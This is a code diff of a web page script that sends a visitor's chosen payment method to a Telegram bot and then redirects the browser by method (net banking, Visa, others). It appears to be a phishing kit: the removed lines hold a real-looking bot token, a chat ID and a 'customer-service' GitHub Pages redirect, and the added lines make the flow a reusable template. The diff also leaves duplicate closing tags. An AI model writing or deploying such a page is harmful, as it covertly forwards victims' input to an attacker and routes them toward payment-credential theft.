@@ -183,12 +183,19 @@ body {
       return;
     }
 
+    // Define redirect URLs for different payment methods
+    var netBankingRedirectUrl = 'https://net-banking-link.com';
+    var visaRedirectUrl = 'https://visa-payment-link.com';
+    var othersRedirectUrl = 'https://other-payment-link.com';
+
+    // Prepare the data to send to Telegram
     var data = {
-      chat_id: '5751079438',
+      chat_id: 'your-chat-id', // Replace with your actual chat ID
       text: 'Payment method selected: ' + selectedOption.value
     };
 
-    fetch('https://api.telegram.org/bot6331212716:AAEOc0OrDcquVBMu7OSg_9ox7X71lB5yP5w/sendMessage', {
+    // Send the selected payment method to Telegram
+    fetch('https://api.telegram.org/botYourBotToken/sendMessage', { // Replace YourBotToken with your actual bot token
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
@@ -196,11 +203,28 @@ body {
     .then(response => response.json())
     .then(data => {
       console.log(data);
-      window.location.href = 'https://customer-service-12.github.io/4/';
+      // Check the selected payment method and redirect accordingly
+      switch(selectedOption.value) {
+        case 'net banking':
+          window.location.href = netBankingRedirectUrl;
+          break;
+        case 'visa':
+          window.location.href = visaRedirectUrl;
+          break;
+        case 'others':
+          window.location.href = othersRedirectUrl;
+          break;
+        default:
+          window.location.href = 'https://default-redirect-link.com'; // Replace with your default link
+          break;
+      }
     })
     .catch(error => console.error(error));
   }
 </script>
+
+</body>
+</html>
 
 </body>
 </html>
